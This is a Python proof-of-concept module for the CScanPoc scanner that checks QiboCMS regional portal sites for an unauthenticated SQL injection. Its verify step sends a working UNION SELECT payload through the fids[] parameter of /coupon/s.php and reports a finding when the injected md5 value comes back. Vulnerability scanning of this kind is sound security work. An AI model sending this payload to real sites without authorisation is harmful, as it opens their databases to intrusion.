# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0019' # 平台漏洞编号，留空
    name = '齐博地方门户系统SQL注入漏洞(无需登录可批量)' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-30'  # 漏洞公布时间
    desc = '''
        齐博地方门户系统SQL注入漏洞(无需登录可批量)
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=079938' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fbb91da4-8cd1-44f4-a238-72e10a5d26f0'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/coupon/s.php??action=search&keyword=11&fid=1&fids[]=0) union select md5(3.1415),2,3,4,5,6,7,8,9%23"
            url = arg + payload
            code, head, res, errcode, _ = hh.http('"%s"' % url)
            if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()